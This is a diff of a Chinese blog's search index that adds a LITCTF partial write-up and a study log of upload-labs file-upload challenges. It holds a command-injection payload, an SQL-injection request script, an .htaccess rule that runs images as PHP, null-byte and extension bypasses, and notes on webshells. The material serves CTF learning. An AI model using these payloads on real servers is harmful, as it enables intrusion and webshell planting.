@@ -7,10 +7,34 @@
 ]]></content>
   </entry>
   <entry>
-    <title>hackthebox做题记录</title>
-    <url>/2023/08/03/hackthebox%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>或许人总是要和生活和解🚬<br>*<br>早上好！还没写</p>
-<span id="more"></span>]]></content>
+    <title>LITCTF部分wp</title>
+    <url>/2023/08/03/LITCTF%E9%83%A8%E5%88%86wp/</url>
+    <content><![CDATA[<p>或许人总是要和生活和解🚬<br>*<br>被中学生薄纱的三天</p>
+<span id="more"></span>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="My-boss-left"><a href="#My-boss-left" class="headerlink" title="My boss left"></a>My boss left</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk</span><br></pre></td></tr></table></figure>
+
+<h2 id="unsecure"><a href="#unsecure" class="headerlink" title="unsecure"></a>unsecure</h2><p><code>password=password123&amp;username=admin</code><br>重定向<br>bp，在http history里能看到flag</p>
+<h2 id="Ping-Pong"><a href="#Ping-Pong" class="headerlink" title="Ping Pong"></a>Ping Pong</h2><p>十分钟靶机真的是世界上最离谱的东西<br>还好这题简单🚬🚬🚬<br><code>00;cat flag.txt</code></p>
+<h2 id="amogsus-api"><a href="#amogsus-api" class="headerlink" title="amogsus-api"></a>amogsus-api</h2><p>本题感谢potato的帮助🙏🙏🙏<br>&amp;被嘲笑了()</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://litctf.org:31783/signup&#x27;</span></span><br><span class="line">d = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">r = requests.post(url, data=d)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://litctf.org:31783/login&#x27;</span></span><br><span class="line">d = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">r = requests.post(url, data=d)</span><br><span class="line">token = r.json().get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://litctf.org:31783/account&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;token&#125;</span>&#x27;</span>&#125;</span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://litctf.org:31783/account/update&#x27;</span></span><br><span class="line">d = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&quot;,sus=&quot;1&quot;--+&#x27;</span>, <span class="string">&#x27;sus&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line">r = requests.post(url, data=d,headers=headers)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://litctf.org:31783/flag&quot;</span></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>凯撒加密</p>
+<h2 id="kevin"><a href="#kevin" class="headerlink" title="kevin"></a>kevin</h2><p>Stegsolve，Data Extract，R0&#x2F;G0&#x2F;B0</p>
+<h2 id="amogus"><a href="#amogus" class="headerlink" title="amogus"></a>amogus</h2><p>查看exif</p>
+<ul>
+<li>还以为和它花里胡哨的链接有什么关系呢😅😅😅</li>
+</ul>
+<h2 id="Blank-and-Empty"><a href="#Blank-and-Empty" class="headerlink" title="Blank and Empty"></a>Blank and Empty</h2><p>whitespace<br><a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a><br>能解，把报错部分去掉</p>
+<ul>
+<li>syy改成<code>1</code>&#x2F;<code>0</code>&#x2F;<code> </code>，然后解二进制也可以，还没有乱七八糟的报错干扰</li>
+</ul>
+<h2 id="discord-and-more"><a href="#discord-and-more" class="headerlink" title="discord and more"></a>discord and more</h2><p>discord有一半，开幕式视频大概十几分钟的地方有下一半这样</p>
+<h2 id="incredible"><a href="#incredible" class="headerlink" title="incredible"></a>incredible</h2><p>复制表格数据&gt;随便开个excel&gt;条件格式&gt;突出显示单元格&gt;大于1</p>
+<p><img src="https://pic.imgdb.cn/item/64d3229b1ddac507cc375f35.jpg"></p>
+<ul>
+<li>要我说谁家M长得和H一个样啊。。？！</li>
+</ul>
+]]></content>
   </entry>
   <entry>
     <title>2023暑期学习记录week4</title>
@@ -20,6 +44,75 @@
 <p><img src="https://pic.imgdb.cn/item/64cb14341ddac507ccddff8a.jpg"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font size=10&gt;**现在你看到的是week4**&lt;/font&gt;**（恨声）**</span><br><span class="line">不知道犯了什么天条，github疯狂报错😅😅😅，新博客一直传不上去</span><br><span class="line">*</span><br><span class="line">我是真崩溃啊试了个把标题设置成之前一样（week2）的然后成功部署了，为什么不能用新标题？啊？啊？啊？啊啊啊啊啊？？？？？？？？？？？？？？？？？？？？？？？？</span><br><span class="line">*</span><br><span class="line">这是w e e k 4（咬牙切齿）</span><br><span class="line">嘛玩意，，等我有时间了，，我，，必，，杀，，之</span><br><span class="line">*</span><br><span class="line">呵呵，再试一次week4</span><br><span class="line">*</span><br><span class="line">失败，week2</span><br><span class="line">从晚上10:29开始到现在00:15了，，特别特别无语特别特别绝望🥲🥲🥲🥲🥲🥲🥲</span><br><span class="line">![](https://pic.imgdb.cn/item/64ca81ab1ddac507cc0b128f.jpg)</span><br><span class="line">一直报错</span><br></pre></td></tr></table></figure>
 <p>美好的一天从github突然又不抽风了开始</p>
+<hr>
+<h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马</a><br><a href="https://zhuanlan.zhihu.com/p/200897500">黑客技术：文件上传漏洞——一句话木马原理 - 知乎</a></p>
+<blockquote>
+<p>Webshell：webshell就是以网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门，顾名思义，web的含义是显然需要服务器开放web服务，shell的含义是取得对服务器某种程度上的操作权限</p>
+<p>Webshell通常被叫做入侵者通过网站端口对网站服务器的某种程度上操作的权限，由于webshell大多数是以动态脚本的形式出现，也有人称之为网站的后门工具，一句话木马、大马、小马都可以叫webshell。</p>
+<p>而我们的一句话木马只需要一行代码的木马，短短的一行代码，配合webshell工具使用就会有很强大的效果。</p>
+<p>为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</p>
+</blockquote>
+<h3 id="各种语言的一句话木马"><a href="#各种语言的一句话木马" class="headerlink" title="各种语言的一句话木马"></a>各种语言的一句话木马</h3><p><a href="https://blog.csdn.net/qq_44632668/article/details/97818432">史上最全的一句话木马</a></p>
+<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p><a href="https://zhuanlan.zhihu.com/p/138200793">PHP之一句话木马 - 知乎</a></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="https://pic.imgdb.cn/item/64cdae611ddac507cc601e7d.jpg"><br><a href="https://blog.csdn.net/qq_42263820/article/details/109587682">文件上传漏洞类型汇总（详细）</a></p>
+<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/128732133">PhpStudy下载安装使用教程，图文教程（超详细）</a><br><a href="https://blog.csdn.net/m0_51295934/article/details/122534380">搭建upload-labs（windows）</a></p>
+<p>质疑phpstudy，理解phpstudy，赞美phpstudy。。这也太方便了！</p>
+<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>随机一个最简单的<code>&lt;?php phpinfo();?&gt;</code><br>说只能jpg&#x2F;png&#x2F;gif文件<br>文件后缀jpg，bp抓包改filename后缀。。<br>看\WWW\upload-labs\WWW\upload，有php文件即可。。or打开http:xxxxxxxx&#x2F;upload&#x2F;webshell.php</p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>一样</p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>不允许上传.asp,.aspx,.php,.jsp后缀文件<br><a href="https://blog.csdn.net/niqiu320/article/details/116177286">文件上传漏洞asp、php、jsp、aspx如何绕过黑名单</a></p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>此文件不允许上传<br>看看源码</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">    $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">    $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">    $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure>
+<p>这个过滤让人眼前一黑的程度堪比某土豆出的ssti。。。感觉一般的改后缀救不了。。</p>
+<p>.htaccess: </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;jpg&quot;</span>&gt;</span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">#进行文件名的正则匹配，服务器会对文件名为1.png当做php解析</span></span><br></pre></td></tr></table></figure>
+<p>看眼http:xxxxxxxx&#x2F;upload&#x2F;webshell.php。。<br>泰库辣。。</p>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>此文件类型不允许上传<br>看看源码<br>多过滤了个.htaccess<br>开源码逐行对比一下&#x2F;&#x2F;（目移<br>发现本题少了转换大小写<code>$file_ext = strtolower($file_ext); //转换为小写</code>这句<br>后缀PHP，启动！</p>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>没过滤<code>$file_ext = trim($file_ext); //收尾去空</code><br>尾巴加空</p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>试了一下，估计是没去除文件名最后的点，加点试试</p>
+<p>看眼源码，猜对了</p>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>::$DATA</p>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>嵌套绕过<br>研究源码可得会先删点再去空<br>“webshell.php. .”</p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>上传”webshell.php”成功，但是看文件夹变成”webshell”了<br>研究一下源码，发现是从文件名中去除字符串<br>双写绕过看看pphphp</p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>看看源码，只允许上传’jpg’,’png’,’gif’文件<br>发现其上传路径可控<br><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p>
+<p><a href="https://blog.csdn.net/redwand/article/details/104152782">【文件上传】00截断详解</a></p>
+<p><code>?save_path=../upload/webshell.php%00 </code></p>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>和上一题一样但是post形式</p>
+<blockquote>
+<p>%00 urldecoded一下</p>
+</blockquote>
+<h2 id=""><a href="#" class="headerlink" title=".."></a>..</h2><p>以下图片马的部分跟着wp过一遍的比较多。。（目移</p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>随便一个图片1.jpg<br><code>copy 1.png /b + webshell.php /a 2.png</code></p>
+<p><code>include.php?file=xxxxx.jpg</code></p>
+<ul>
+<li>没有include.php自己建一个</li>
+</ul>
+<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>试着跟上一题一样然后成功了、</p>
+<blockquote>
+<p>getimagesize()简介<br>这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>
+</blockquote>
+<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>同上</p>
+<blockquote>
+<p>exif_imagetype()<br>读取一个图像的第一个字节并检查其签名。</p>
+</blockquote>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>二次渲染<br><a href="https://wwe.lanzoui.com/iFSwwn53jaf">文件上传之二次渲染(专用图).zip - 蓝奏云</a></p>
+<p>但是我之前的也可以用。。</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>条件竞争，不会，抄之<br><a href="https://www.freebuf.com/articles/web/305581.html">条件上传之竞争漏洞 - FreeBuf网络安全行业门户</a><br><a href="https://blog.csdn.net/mmzkyl/article/details/112318210">条件竞争之文件上传</a></p>
+<p>上传，bp的intruder爆破一下，然后可以写脚本，也可以像我一样狂按f5</p>
+<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>浅试了一下。。上传路径好像有点问题。。。（沉默）<br>打开WWW文件夹后发现一排的水母图片的心情谁懂啊。。。</p>
+<p>然后这题就是图片马加Pass-17这样。。。</p>
+<p>又是f5按烂的一题</p>
+<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>不知道为什么我&#x2F;include.php?file&#x3D;upload-19.jpg出来了<br>但是好像这题主要不考这个</p>
+<ul>
+<li>00截断</li>
+<li>move_uploaded_file()特性：忽略掉文件末尾的 <code>/.</code><ul>
+<li>bp抓包，改成php&#x2F;.</li>
+</ul>
+</li>
+</ul>
+<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><blockquote>
+<p>第二十关<br>这一关是利用数组绕过验证<br>十九关是一个黑名单，php&#x2F;.就可以绕过，但是二十关他会检测文件后缀名，是一个白名单。所以把他拆分掉第三部分是.png，所以就会上传。实际上他上传上去的东西是<br>upload-21.php&#x2F;.png 上传上去的东西就是upload-21.php。实现了绕过。</p>
+</blockquote>
+<p><img src="https://pic.imgdb.cn/item/64d30d861ddac507cc028f3c.jpg"><br>抄是抄完了，但是我不明白（茫然</p>
 ]]></content>
   </entry>
   <entry>
